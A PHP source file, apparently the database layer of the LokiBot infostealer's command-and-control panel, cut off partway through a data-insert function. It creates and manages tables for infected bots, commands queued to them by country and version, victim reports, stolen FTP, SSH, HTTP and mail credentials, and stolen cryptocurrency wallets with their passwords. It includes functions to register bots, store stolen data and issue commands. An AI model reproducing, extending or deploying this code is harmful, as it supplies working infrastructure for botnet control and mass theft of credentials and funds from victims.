<?php
	if(!defined('IN_LOKI')) die();
	
	define("LOKI_DATA_TABLE", 	 		"data");
	define("LOKI_USER_TABLE", 	 		"users");
	define("LOKI_REPORT_TABLE",  		"reports");
	define("LOKI_LOGS_TABLE", 	 		"logs");
	define("LOKI_WALLETS_TABLE", 		"wallets");
	define("LOKI_BOTS_TABLE",	 		"bots");
	define("LOKI_COMMAND_TABLE", 		"commands");
	define("LOKI_COMMAND_LOG_TABLE",   	"commands_log");
	
	if(!defined("NULL_LOG"))
	{
		define("NULL_LOG", 		0);
		define("ERROR_LOG", 	1);
		define("WARNING_LOG", 	2);
		define("INFO_LOG", 		3);
	}
	
	class LokiDB
	{
		public $DBHandle;
		public $State;
		public $Verbose = TRUE;
		public $Loglevel = 0;

		public $Cookie = '';
		public $UserID = '';
		public $Settings = '';

		protected $Prefix 			= "loki";
		protected $Engine 			= "InnoDB";
		protected $Charset 			= "utf8";
		protected $Required_Tables 	= array('users', 'reports', 'data', 'logs', 'wallets');
		protected $EnabledSettings 	= array('Privileges', 'PageLimit', 'LastLogin', 'LastView', 'JabberID', 'LangID');

		function __construct($Host, $User, $Pass, $Database, $Port,  $Prefix = NULL, $CreateTable = FALSE, $Verbose = FALSE, $LogLevel = 0)
		{
			if($Verbose != FALSE)
				$this->Verbose = $Verbose;
			
			if($LogLevel != 0)
				$this->Loglevel = $LogLevel;
			
			if($Prefix != NULL && strlen($Prefix))
				$this->Prefix = $Prefix;

			$this->UpdateRequiredTables();
			
			$this->DBHandle = NULL;
			$this->State 	= TRUE;

			$this->DBHandle = new mysqli($Host, $User, $Pass, $Database, $Port);

			if ($this->DBHandle->connect_errno)
				$this->Error_('Can\'t connect to mysql database!', __FUNCTION__);
				
			if($CreateTable != FALSE)
				$this->CreateTables();

			$TablesExists = $this->AllTablesExists();

			if (!$this->State)
				$this->Error_('Unknown MySQL Error!', __FUNCTION__);
			
			if (!$TablesExists)
				$this->Error_('Missing required MySQL Database tables!', __FUNCTION__, FALSE);
			
			return TRUE;
		}

		function __destruct() 
		{
		}

		function CreateTables()
		{
			$Query = "";
			if(MODULE_LOADER)
			{
				$Query .= "
				CREATE TABLE IF NOT EXISTS `".$this->GetTableName(LOKI_BOTS_TABLE)."` (
				`bot_id` int(11) NOT NULL,
				  `bot_guid` varchar(32) NOT NULL,
				  `bot_os` int(2) NOT NULL,
				  `bot_is_win64` int(1) NOT NULL,
				  `bot_account` int(1) NOT NULL,
				  `bot_ip` varchar(20) NOT NULL,
				  `bot_reports` int(11) DEFAULT NULL,
				  `bot_country` varchar(3) NOT NULL,
				  `bot_first_online` int(11) NOT NULL,
				  `bot_last_online` int(11) NOT NULL,
				  `bot_version` int(11) NOT NULL,
				  `bot_bin_id` varchar(11) NOT NULL,
				  `bot_screen` varchar(10) NOT NULL,
				  `bot_coin` int(1) NOT NULL,
				  `bot_name` varchar(100) NOT NULL
				) ENGINE=".$this->Engine." DEFAULT CHARSET=".$this->Charset.";";
				
				$Query .= "
				CREATE TABLE IF NOT EXISTS `".$this->GetTableName(LOKI_COMMAND_TABLE)."` (
				`command_id` int(11) NOT NULL,
				  `command_comment` varchar(150) NOT NULL,
				  `command_elevated` int(11) NOT NULL,
				  `command_is_win64` int(1) NOT NULL,
				  `command_os` varchar(40) NOT NULL,
				  `command_country` text NOT NULL,
				  `command_version` float NOT NULL,
				  `command_bin_id` varchar(11) NOT NULL,
				  `command_wallet` int(1) NOT NULL,
				  `command_limit` int(11) NOT NULL,
				  `command_executed` int(11) NOT NULL,
				  `command_time` int(11) NOT NULL,
				  `command_active` int(1) NOT NULL,
				  `command_time_limit` int(11) NOT NULL,
				  `command_data` text NOT NULL,
				  `command_type` int(2) NOT NULL,
				  `command_duplicate` int(1) NOT NULL,
				  `command_bot_guid` varchar(33) NOT NULL,
				  `command_loaded` int(11) NOT NULL
				) ENGINE=".$this->Engine." DEFAULT CHARSET=".$this->Charset.";";
				$Query .= "
				CREATE TABLE IF NOT EXISTS `".$this->GetTableName(LOKI_COMMAND_LOG_TABLE)."` (
				`command_log_id` int(11) NOT NULL,
				  `command_log_command_id` int(11) NOT NULL,
				  `command_log_bot_id` int(11) NOT NULL,
				  `command_log_time` int(11) NOT NULL
				) ENGINE=".$this->Engine." DEFAULT CHARSET=".$this->Charset.";";
				
				$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_BOTS_TABLE)."` ADD PRIMARY KEY (`bot_id`);";
				$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_COMMAND_TABLE)."` ADD PRIMARY KEY (`command_id`);";
				$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_COMMAND_LOG_TABLE)."` ADD PRIMARY KEY (`command_log_id`);";
				$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_BOTS_TABLE)."` MODIFY `bot_id` int(11) NOT NULL AUTO_INCREMENT;";
				$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_COMMAND_TABLE)."` MODIFY `command_id` int(11) NOT NULL AUTO_INCREMENT;";
				$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_COMMAND_LOG_TABLE)."` MODIFY `command_log_id` int(11) NOT NULL AUTO_INCREMENT;";
			}
			
			$Query .= "
			CREATE TABLE IF NOT EXISTS `".$this->GetTableName(LOKI_DATA_TABLE)."` (
			`data_id` int(11) NOT NULL,
			  `report_id` int(11) NOT NULL,
			  `data_time` int(11) NOT NULL,
			  `data_client` int(11) NOT NULL,
			  `data_type` enum('ftp','ssh','http','data','datadl','error','mail', 'dump') NOT NULL,
			  `data_text` blob NOT NULL,
			  `data_hash` varchar(40) NOT NULL
			) ENGINE=".$this->Engine." DEFAULT CHARSET=".$this->Charset.";";
			$Query .= "
			CREATE TABLE IF NOT EXISTS `".$this->GetTableName(LOKI_LOGS_TABLE)."` (
			`log_id` int(11) NOT NULL,
			  `log_type` varchar(30) NOT NULL,
			  `log_text` varchar(300) NOT NULL,
			  `log_time` int(11) NOT NULL
			) ENGINE=".$this->Engine." DEFAULT CHARSET=".$this->Charset.";";
			$Query .= "
			CREATE TABLE IF NOT EXISTS `".$this->GetTableName(LOKI_REPORT_TABLE)."` (
			`report_id` int(11) NOT NULL,
			  `report_time` int(11) NOT NULL,
			  `report_guid` varchar(32) NOT NULL,
			  `report_os` int(4) NOT NULL,
			  `report_is_win64` int(1) NOT NULL,
			  `report_account` int(1) NOT NULL,
			  `report_ip` varchar(20) NOT NULL,
			  `report_country` varchar(2) NOT NULL,
			  `report_version` float NOT NULL,
			  `report_bin_id` varchar(11) NOT NULL,
			  `report_data` blob NOT NULL,
			  `report_hash` varchar(42) NOT NULL,
			  `report_screen` varchar(10) NOT NULL,
			  `report_name` varchar(100) NOT NULL,
			  `report_data_num` int(11) NOT NULL
			) ENGINE=".$this->Engine." DEFAULT CHARSET=".$this->Charset.";";
			$Query .= "
			CREATE TABLE IF NOT EXISTS `".$this->GetTableName(LOKI_USER_TABLE)."` (
			`user_id` int(11) NOT NULL,
			  `username` varchar(50) NOT NULL,
			  `password` varchar(50) NOT NULL,
			  `cookie` varchar(300) NOT NULL,
			  `settings` varchar(200) DEFAULT NULL
			) ENGINE=".$this->Engine." DEFAULT CHARSET=".$this->Charset.";";
			if(MODULE_WALLET)
			{
				$Query .= "
				CREATE TABLE IF NOT EXISTS `".$this->GetTableName(LOKI_WALLETS_TABLE)."` (
				`wallet_id` int(11) NOT NULL,
				  `report_id` int(11) NOT NULL,
				  `wallet_time` int(11) NOT NULL,
				  `wallet_name` varchar(100) NOT NULL,
				  `wallet_size` int(11) NOT NULL,
				  `wallet_client` int(11) NOT NULL,
				  `wallet_balance` varchar(30) NOT NULL,
				  `wallet_locked` tinyint(1) NOT NULL,
				  `wallet_transactions` tinyint(1) NOT NULL,
				  `wallet_cheked` tinyint(1) NOT NULL,
				  `wallet_hash` varchar(40) NOT NULL,
				  `wallet_password` varchar(50) NOT NULL
				) ENGINE=".$this->Engine." DEFAULT CHARSET=".$this->Charset.";";
				
				$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_WALLETS_TABLE)."` ADD PRIMARY KEY (`wallet_id`);";
				$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_WALLETS_TABLE)."` MODIFY `wallet_id` int(11) NOT NULL AUTO_INCREMENT;";
			}
			
			$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_DATA_TABLE)."` ADD PRIMARY KEY (`data_id`);";
			$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_LOGS_TABLE)."` ADD PRIMARY KEY (`log_id`);";
			$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_REPORT_TABLE)."` ADD PRIMARY KEY (`report_id`);";
			$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_USER_TABLE)."` ADD PRIMARY KEY (`user_id`), ADD UNIQUE KEY `username` (`username`);";
			
			$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_DATA_TABLE)."` MODIFY `data_id` int(11) NOT NULL AUTO_INCREMENT;";
			$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_LOGS_TABLE)."` MODIFY `log_id` int(11) NOT NULL AUTO_INCREMENT;";
			$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_REPORT_TABLE)."` MODIFY `report_id` int(11) NOT NULL AUTO_INCREMENT;";
			$Query .= "ALTER TABLE `".$this->GetTableName(LOKI_USER_TABLE)."` MODIFY `user_id` int(11) NOT NULL AUTO_INCREMENT;";
			

			$Result = $this->DBMultiQuery($Query);
			if (!$Result)
				$this->Error_('Can\'t create table!', __FUNCTION__);

			while ($this->DBHandle->next_result())
			{
				if (!$this->DBHandle->more_results()) 
					break;
			}
			
			return $Result;
		}

		function Close()
		{
			if ($this->DBHandle)
			{
				$this->State = FALSE;
				$this->DBHandle->close();
			}
		}

		function GetTableName($Table)
		{
			return $this->Prefix . "_" . $Table;
		}

		function UpdateRequiredTables()
		{
			$i = 0;
			$Elements = sizeof($this->Required_Tables);
			while($Elements > $i)
			{
				$this->Required_Tables[$i] = $this->GetTableName($this->Required_Tables[$i]);
				$i++;
			}
		}

		function DBQuery($Query)
		{
			if (!$this->State)
				return NULL;

			$Result = NULL;

			if ((!$Result = $this->DBHandle->query($Query)))
			{
				$this->Error_("Query failed: (" . $Query . ") " . $this->DBHandle->error, __FUNCTION__);
				return NULL;
			}

			return $Result;
		}
		
		function DBMultiQuery($Querys)
		{
			if (!$this->State)
				return NULL;

			$Result = NULL;

			if ((!$Result = $this->DBHandle->multi_query($Querys)))
			{
				$this->Error_("Querys failed: (" . $Querys . ") " . $this->DBHandle->error, __FUNCTION__);
				return NULL;
			}

			return $Result;
		}
		
		function DropTables()
		{
			if (!$this->State)
				return FALSE;

			foreach ($this->Required_Tables as $Table)
			{
				$this->DropTable($this->GetTableName($Table));
			}

			return $this->State;
		}

		function FlushTable($Table)
		{
			if (!$this->State)
				return FALSE;

			$Result = $this->DBQuery("TRUNCATE TABLE " . $this->EscapeString($Table));

			if (!$Result)
				$this->State = FALSE;
			else
				return TRUE;

			return FALSE;
		}

		function DropTable($Table)
		{
			$Table = trim($Table);
			if (!$this->State || !strlen($Table))
				return FALSE;

			$Result = $this->DBQuery("DROP TABLE IF EXISTS " . $this->EscapeString($Table));

			if (!$Result)
				$this->State = FALSE;
			else
				return TRUE;

			return FALSE;
		}

		function EscapeString($Source)
		{
			return $this->DBHandle->real_escape_string($Source);
		}

		function AllTablesExists()
		{
			if (!$this->State)
				return FALSE;

			$Result = $this->DBQuery("SHOW TABLES");
			if (!$Result)
			{
				$this->State = FALSE;
				return FALSE;
			}

			$CurrentTables = array();
			while ($Row = $Result->fetch_assoc())
			{
				foreach ($Row as $Table)
				{
					array_push($CurrentTables, $Table);
				}
			}

			$Result->free();

			$Diff = array_diff($this->Required_Tables, $CurrentTables);

			if (count($Diff) != NULL)
			{
				return FALSE;
			}

			return TRUE;
		}

		private function Error_($Message, $Function = '', $MySQLError = TRUE)
		{
			ob_clean();
			if ($this->Verbose)
			{
				$Result = 'MESSAGE: '. $Message;
				if(strlen($Function))
				{
					$Result .= '<br/>WHERE: '.$Function . '()';
				}
				if($MySQLError)
				{
					$Result .= '<br/>ERROR: '.$this->DBHandle->connect_error;
				}
				
				print '<div class="error">'.$Result.'</div>';
			}
			
			$this->Close();
			die();
		}
		
		function RemoveItem($Table, $Rows, $Data)
		{
			$bResult = FALSE;
			
			if (!($STMT = $this->DBHandle->prepare("DELETE FROM `".$Table. "` WHERE ".$Rows." = ?")))
				return $bResult;

			$Data = $this->EscapeString(intval($Data));

			if (($STMT->bind_param('i', $Data)))
			{
				if ($STMT->execute())
					$bResult = TRUE;
			}
			
			$STMT->close();
			return $bResult;
		}

		function BuildWhere($Source, $Where, $OR_ = FALSE)
		{
			$Result = '';
			if(strlen($Source) && strstr($Source, "WHERE"))
			{
				if(!$OR_)
					$Result = $Source . ' AND ' . $Where . '';
				else
					$Result = $Source . ' OR ' . $Where . '';
			}
			else
				$Result = $Source . ' WHERE ' . $Where . '';
			
			return $Result;
		}
		
		function CountTpl($Table, $CntRow, $WhereRow = NULL, $Integer = NULL, $String = NULL)
		{
			$Query = "SELECT COUNT(".$CntRow.") FROM " . $Table;
			if($WhereRow !== NULL)
				$Query .= " WHERE ? = " . $WhereRow;

			if (!($STMT = $this->DBHandle->prepare($Query)))
				return 0;
			
			if($WhereRow !== NULL)
			{
				if($Integer !== NULL)
				{
					$Integer = intval($Integer);
					if (!($STMT->bind_param('i', $Integer)))
						return 0;
				}
				
				if($String !== NULL)
				{
					$String = $this->EscapeString($String);
					if (!($STMT->bind_param('s', $String)))
						return 0;
				}
			}
			
			$STMT->bind_result($Result);

			if (!$STMT->execute())
				return 0;
			
			$STMT->store_result();
			if($STMT->num_rows > 0)
			{
				if (!$STMT->fetch())
					$this->Error_(__FUNCTION__. "() Fetch failed: (" . $STMT->errno . ") " . $STMT->error);
			}

			$STMT->free_result();
			$STMT->close();

			return $Result;
		}
		
		/*
		*
		* 	USER
		*
		*/
		
		function InsertLog($Level, $Type, $Text) // OK
		{
			if($this->Loglevel == NULL_LOG || $Level > $this->Loglevel)
			{
				return FALSE;
			}
			
			if($Level == INFO_LOG)
				$Type = "INFO_" . $Type;
			if($Level == WARNING_LOG)
				$Type = "WARNING_" . $Type;
			if($Level == ERROR_LOG)
				$Type = "ERROR_" . $Type;
			
			if (!($STMT = $this->DBHandle->prepare("INSERT INTO `".$this->GetTableName(LOKI_LOGS_TABLE). "` (`log_type`, `log_text`, `log_time`) VALUES (?, ?, ?)")))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			$Time = intval(time());
			$Type = $this->EscapeString($Type);
			$Text = $this->EscapeString($Text);

			if (!($STMT->bind_param('ssi', $Type, $Text, $Time)))
			{
				$this->Error_("Bind failed!", __FUNCTION__);
				$Result = FALSE;
			}
			
			if (!$STMT->execute())
			{
				$this->Error_("Execute failed!", __FUNCTION__);
				$Result = FALSE;
			}

			$STMT->close();
			return TRUE;
		}
		
		function AuthLogin($Username, $Password) // OK
		{
			$Result = FALSE;
			
			if(!strlen($Username) && !strlen($Password))
				return FALSE;
			
			if (!($STMT = $this->DBHandle->prepare("SELECT `user_id`, `settings` FROM `".$this->GetTableName(LOKI_USER_TABLE)."` WHERE username = ? AND password = ? LIMIT 1")))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}
			
			$Username = $this->EscapeString(trim($Username));
			$Password = $this->EscapeString(GetSaltedHash(trim($Password)));
			
			if (!($STMT->bind_param('ss', $Username, $Password)))
			{
				$this->Error_("Bind failed!", __FUNCTION__);
			}

			if (!$STMT->bind_result($UserID_, $Settings_))
			{
				$this->Error_("Bind result failed!", __FUNCTION__);
			}
			
			if (!$STMT->execute())
			{
				$this->Error_("Execute failed!", __FUNCTION__);
			}

			$STMT->store_result();

			if($STMT->num_rows == 1)
			{
				$STMT->fetch();

				$this->UserID   = $UserID_;
				$this->Settings = str_replace("\\", "", $Settings_);

				$this->UpdateAuthCookie(GetSaltedHash(6951 * microtime()));
				
				$Result = TRUE;
			}

			$STMT->free_result();
			$STMT->close();

			return $Result;
		}
		
		function UpdateAuthCookie($Cookie, $UserID = NULL) // OK
		{
			$Result = TRUE;
			if($UserID == NULL)
				$UserID = $this->UserID;

			$UserID = $this->EscapeString(intval($UserID));
			$Cookie = $this->EscapeString(trim($Cookie));

			if (!$this->State || $UserID < 0 || !strlen($Cookie))
				return FALSE;

			if (!($STMT = $this->DBHandle->prepare("UPDATE `".$this->GetTableName(LOKI_USER_TABLE)."` SET cookie = ? WHERE user_id = ?")))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			if (!($STMT->bind_param('si', $Cookie, $UserID)))
			{
				$this->Error_("Bind failed!", __FUNCTION__);
				$Result = FALSE;
			}

			if (!$STMT->execute())
			{
				$this->Error_("Execute failed!", __FUNCTION__);
				$Result = FALSE;
			}
			else
			{
				$this->State  = TRUE;
				$this->Cookie = $Cookie;
			}

			$STMT->close();
			return $Result;
		}
		
		function RemoveAuthCookie($UserID = NULL) // OK
		{
			return $this->UpdateAuthCookie("-LO-", $UserID);
		}
		
		function AuthCookie($Cookie) // OK
		{
			$Cookie = $this->EscapeString($Cookie);
			if($Cookie == "-LO-")
				return FALSE;
			
			if (!($STMT = $this->DBHandle->prepare("SELECT `user_id`, `settings` FROM `".$this->GetTableName(LOKI_USER_TABLE)."` WHERE cookie = ? LIMIT 1")))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			if (!($STMT->bind_param('s', $Cookie)))
			{
				$this->Error_('Bind failed!', __FUNCTION__);
				return FALSE;
			}

			$STMT->bind_result($UserID_, $Settings_);

			if (!$STMT->execute())
			{
				$this->Error_('Execute failed!', __FUNCTION__);
				return FALSE;
			}

			$STMT->store_result();
			if($STMT->num_rows == 1)
			{
				$STMT->fetch();

				$this->UserID = $UserID_;
				$this->Settings = str_replace("\\", "", $Settings_);

				$STMT->free_result();
				$STMT->close();
				return TRUE;
			}

			$STMT->free_result();
			$STMT->close();

			return FALSE;
		}
		//{"PageLimit":10,"LastLogin":0,"LastView":0,"JabberID":0,"LangID":0}
		function ChangeSettings($Element, $Value, $UserID = NULL)
		{
			if($this->Settings == NULL || !($this->Settings))
				return FALSE;

			if (array_search($Element, $this->EnabledSettings) === FALSE)
				return FALSE;

			$JSON_ = json_decode($this->Settings, true);
			$JSON_[$Element] = $this->EscapeString(trim($Value));
			$this->Settings = json_encode($JSON_);

			if($UserID == NULL)
				$UserID = $this->UserID;

			$UserID   = $this->EscapeString(intval($UserID));
			$Settings = trim($this->Settings);

			if (!($STMT = $this->DBHandle->prepare("UPDATE `".$this->GetTableName(LOKI_USER_TABLE)."` SET settings = ? WHERE user_id = ?")))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			if (!($STMT->bind_param('si', $Settings, $UserID)))
			{
				$this->Error_('Bind failed!', __FUNCTION__);
				return FALSE;
			}
			
			if (!$STMT->execute())
			{
				$this->Error_('Execute failed!', __FUNCTION__);
				return FALSE;
			}
			else
			{
				$STMT->close();
				return TRUE;
			}

			return FALSE;
		}

		function GetSettings($Element, $Settings = NULL)
		{
			if($Settings == NULL)
				$Settings = str_replace("\\", "", $this->Settings);
			else
				$Settings = str_replace("\\", "", $Settings);


			if($Settings == NULL || !strlen($Settings) || $Element == NULL && !strlen($Element))
			{
				//Get Settings
				return NULL;
			}

			$JSON_ = json_decode($Settings, true);

			return isset($JSON_[$Element]) ? $JSON_[$Element] : NULL;
		}

		function ChangePassword($Password, $UserID = NULL)
		{
			if($UserID == NULL)
				$UserID = $this->UserID;

			$Result   = FALSE;
			$UserID   = $this->EscapeString(intval($UserID));
			$Password = GetSaltedHash($this->EscapeString($Password));

			if (!($STMT = $this->DBHandle->prepare("UPDATE `".$this->GetTableName(LOKI_USER_TABLE)."` SET password = ? WHERE user_id = ?")))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			if (!($STMT->bind_param('si', $Password, $UserID)))
			{
				$this->Error_('Bind failed!', __FUNCTION__);
				return FALSE;
			}
			
			if (!$STMT->execute())
			{
				$this->Error_('Execute failed!', __FUNCTION__);
				$Result = FALSE;
			}
			else
				$Result = TRUE;

			$STMT->close();
			return $Result;
		}
		
		function AddNewUser($Username, $Password = '', $Privileges = 0)
		{
			if (!($STMT = $this->DBHandle->prepare("INSERT INTO `".$this->GetTableName(LOKI_USER_TABLE). "` (`username`, `password`, `settings`) VALUES (?, ?, ?)")))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			if(!strlen($Password))
			{
				$Password = MakeRandomString(9);
			}

			$Username 	= $this->EscapeString(trim($Username));
			$Password 	= GetSaltedHash($this->EscapeString(trim($Password)));
			$Settings 	= '{"Privileges":"'.$this->EscapeString(intval(trim($Privileges))).'","PageLimit":"20","LastLogin":0,"LastView":0,"JabberID":"-","LangID":"en"}';

			if (!($STMT->bind_param('sss', $Username, $Password, $Settings)))
			{
				$this->Error_("Bind failed: (" . $STMT->errno . ") " . $STMT->error);
				$STMT->close();
				return FALSE;
			}

			if (!$STMT->execute())
			{
				$this->Error_("Execute failed: (" . $STMT->errno . ") " . $STMT->error);
				$STMT->close();
				return FALSE;
			}

			$STMT->close();
			return TRUE;
		}

		function RemoveUser($UserID)
		{
			return $this->RemoveItem($this->GetTableName(LOKI_USER_TABLE), "user_id", $UserID);
		}
		
		/*
		*
		* 	USER
		*
		*/

		function RemoveCommand($CommandID)
		{
			return $this->RemoveItem($this->GetTableName(LOKI_COMMAND_TABLE), "command_id", $CommandID);
		}
		
		function UpdateReportData($ReportID)
		{
			$Query = "UPDATE `".$this->GetTableName(LOKI_REPORT_TABLE)."` SET report_data = '' WHERE report_id =".intval($ReportID);
			if ((!$Result = $this->DBQuery($Query)))
				return NULL;
		}
		
		function UpdateBotTime($BotID, $IP, $BinID, $BinVersion)
		{
			if($BotID == NULL)
				return FALSE;
			
			$BotID   	= $this->EscapeString(intval($BotID));
			$BinVersion = $this->EscapeString($BinVersion);
			$BinID 		= $this->EscapeString($BinID);
			$IP 		= $this->EscapeString($IP);
			$Time 		= time();
			
			if (!($STMT = $this->DBHandle->prepare("UPDATE `".$this->GetTableName(LOKI_BOTS_TABLE)."` SET bot_ip = ?, bot_last_online = ?, bot_version = ?, bot_bin_id = ? WHERE bot_id = ?")))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			if (!($STMT->bind_param('sissi', $IP, $Time, $BinVersion, $BinID, $BotID)))
			{
				$this->Error_('Bind failed!', __FUNCTION__);
				return FALSE;
			}
			
			if (!$STMT->execute())
			{
				$this->Error_('Execute failed!', __FUNCTION__);
				return FALSE;
			}
			else
			{
				$STMT->close();
				return TRUE;
			}

			return FALSE;
		}	
		
		function ChangeCommandState($CommandID, $State)
		{
			$Query = "UPDATE `".$this->GetTableName(LOKI_COMMAND_TABLE)."` SET command_active = ".$State." WHERE command_id =".intval($CommandID);
			if ((!$Result = $this->DBQuery($Query)))
				return NULL;
		}	

		function ElementExists__($Table, $Row, $ByRow, $Data)
		{
			$bResult = NULL;
			
			if (!($STMT = $this->DBHandle->prepare("SELECT `" .$Row. "` FROM `" .$Table. "` WHERE " .$ByRow. " = ? LIMIT 1")))
				return $bResult;

			$Data = $this->EscapeString($Data);
			if (!($STMT->bind_param('s', $Data)))
				return $bResult;
			
			$STMT->bind_result($Result);

			if (!$STMT->execute())
				return $bResult;

			$STMT->store_result();
			if($STMT->num_rows == 1)
			{
				if (!$STMT->fetch())
					$this->Error_(__FUNCTION__. "() Fetch failed: (" . $STMT->errno . ") " . $STMT->error);
				
				$bResult = $Result;
			}
				

			$STMT->free_result();
			$STMT->close();
			
			return $bResult;
		}
		function InsertReport($Time, $IPAddress, $Country, $Os, $Bit, $Account, $Guid, $Version, $DataHash, $Data, $BinID, $Screen, $BotName)
		{
			if($this->ElementExists__($this->GetTableName(LOKI_REPORT_TABLE), "report_id", "report_hash", $DataHash) !== NULL)
				return FALSE;

			if (!($STMT = $this->DBHandle->prepare("INSERT INTO `".$this->GetTableName(LOKI_REPORT_TABLE). "` VALUES (null, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0)")))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}
			
			$Bit 		= intval($Bit);
			$Os 		= intval($Os);
			$Account 	= intval($Account);
			$Time 		= intval($Time);
			
			$BinID 		= $this->EscapeString($BinID);
			$IPAddress 	= $this->EscapeString($IPAddress);
			$Country 	= $this->EscapeString($Country);
			$Guid 		= $this->EscapeString($Guid);
			$Version 	= $this->EscapeString($Version);
			$DataHash 	= $this->EscapeString($DataHash);
			$Screen 	= $this->EscapeString($Screen);
			$BotName 	= $this->EscapeString($BotName);
			//$Data = gzcompress($Data, 1);
			if (!($STMT->bind_param('isiiissssbsss', $Time, $Guid, $Os, $Bit, $Account, $IPAddress, $Country, $Version, $BinID, $null, $DataHash, $Screen, $BotName)))
			{
				$this->Error_("Bind failed: (" . $STMT->errno . ") " . $STMT->error);
				$STMT->close();
				return FALSE;
			}
			
			$STMT->send_long_data(9, $Data);
			
			if (!$STMT->execute())
			{
				$this->Error_("Execute failed: (" . $STMT->errno . ") " . $STMT->error);
				$STMT->close();
				return FALSE;
			}

			$ResultID = $STMT->insert_id;
			$STMT->close();

			return $ResultID;
		}

		function AddReportToBot($GUID_)
		{
			$Query = "UPDATE `".$this->GetTableName(LOKI_BOTS_TABLE)."` SET bot_reports = bot_reports + 1 WHERE bot_guid = '" .$this->EscapeString($GUID_). "'";
			if ((!$Result = $this->DBQuery($Query)))
				return NULL;
		}
		
		function InsertCommand($Comment = '', $Data = '', $Country = 0, $Limit = 0, $Wallet = 0, $Elevated = 0, $BinID = 0, $Version = 0, $Type = 0, $Time = 0, $Duplicate = 0, $BotGuid = 0)
		{
			if (!($STMT = $this->DBHandle->prepare("INSERT INTO `" .$this->GetTableName(LOKI_COMMAND_TABLE). "` VALUES (null,?,?,0,0,?,?,?,?,?,0,?,1,?, ?, ?,?, ?, 0)")))
			{
				return FALSE;
			}
			
			$Limit 		= intval($Limit);
			$Wallet 	= intval($Wallet);
			$Elevated 	= intval($Elevated);
			$Date 		= intval(time());
			
			$Type 		= intval($Type);
			$Time 		= intval($Time);
			$Duplicate 	= intval($Duplicate);
			
			$Comment	= $this->EscapeString($Comment);
			$Data 		= $this->EscapeString($Data);
			$Country 	= $this->EscapeString(strtoupper($Country));
			$Version 	= $this->EscapeString($Version);
			$BinID 		= $this->EscapeString($BinID);
			$BotGuid 		= $this->EscapeString($BotGuid);
			
			if(!strlen($BinID))
				$BinID = 0;
			if(!strlen($BotGuid))
				$BotGuid = 0;
			if(!strlen($Country) || $Country == "ALL")
				$Country = 0;
			
			if (!($STMT->bind_param('sisisiiiisiis', $Comment, $Elevated, $Country, $Version, $BinID, $Wallet, $Limit, $Date, $Time, $Data, $Type, $Duplicate, $BotGuid)))
			{
				$STMT->close();
				return FALSE;
			}
			
			if (!$STMT->execute())
			{
				$STMT->close();
				return FALSE;
			}

			$ResultID = $STMT->insert_id;
			$STMT->close();

			return $ResultID;
		}
		
		function InsertBots($Time, $IP_, $Country, $Os, $Bit, $Account, $Guid, $Version, $BinID, $Screen, $BotName)
		{
			$ID__ = $this->ElementExists__($this->GetTableName(LOKI_BOTS_TABLE), "bot_id", "bot_guid", $Guid);
			if($ID__  !== NULL)
			{
				$this->UpdateBotTime($ID__, $IP_, $BinID , $Version);
				return $ID__ ;
			}
				
			
			if (!($STMT = $this->DBHandle->prepare("INSERT INTO `" .$this->GetTableName(LOKI_BOTS_TABLE). "` VALUES (null, ?, ?, ?, ?, ?, 0, ?, ?, ?, ?, ?, ?, 0, ?)")))
			{
				$this->Error_('Prepare failed!', __FUNCTION__);
				return NULL;
			}
			
			$Bit 		= intval($Bit);
			$Os 		= intval($Os);
			$Account 	= intval($Account);
			$Time 		= intval($Time);
			
			$IP_ 		= $this->EscapeString($IP_);
			$Country 	= $this->EscapeString($Country);
			$Guid 		= $this->EscapeString($Guid);
			$Version 	= $this->EscapeString($Version);
			$BinID 		= $this->EscapeString($BinID);
			$Screen 	= $this->EscapeString($Screen);
			$BotName 	= $this->EscapeString($BotName);
			if (!($STMT->bind_param('siiissiiisss', $Guid, $Os, $Bit, $Account, $IP_, $Country, $Time, $Time, $Version, $BinID, $Screen, $BotName)))
			{
				$this->Error_("Bind failed: (" . $STMT->errno . ") " . $STMT->error);
				$STMT->close();
				return NULL;
			}
			
			if (!$STMT->execute())
			{
				$this->Error_("Execute failed: (" . $STMT->errno . ") " . $STMT->error);
				$STMT->close();
				return NULL;
			}

			$ResultID = $STMT->insert_id;
			$STMT->close();

			return $ResultID;
		}
		
		function InsertData($Data, $DataType, $Time, $ReportID, $DataClient, $DataHash, $NoDupe = TRUE)
		{
			if($NoDupe)
			{
				if($this->ElementExists__($this->GetTableName(LOKI_DATA_TABLE), "data_id", "data_hash", $DataHash) !== NULL)
					return FALSE;
			}
			
			if (!($STMT = $this->DBHandle->prepare("INSERT INTO `".$this->GetTableName(LOKI_DATA_TABLE). "` (`report_id`, `data_time`, `data_client`, `data_text`, `data_hash`, `data_type`) VALUES (?, ?, ?, ?, ?, ?)")))
			 {
				$this->Error_('Prepare failed!', __FUNCTION__);
				return FALSE;
			}

			$Time 		= intval($Time);
			$ReportID 	= intval($ReportID);
			$DataClient = intval($DataClient);

			$Data 		= $this->EscapeString($Data);
			$DataHash 	= $this->EscapeString($DataHash);
			$DataType 	= $this->EscapeString($DataType);

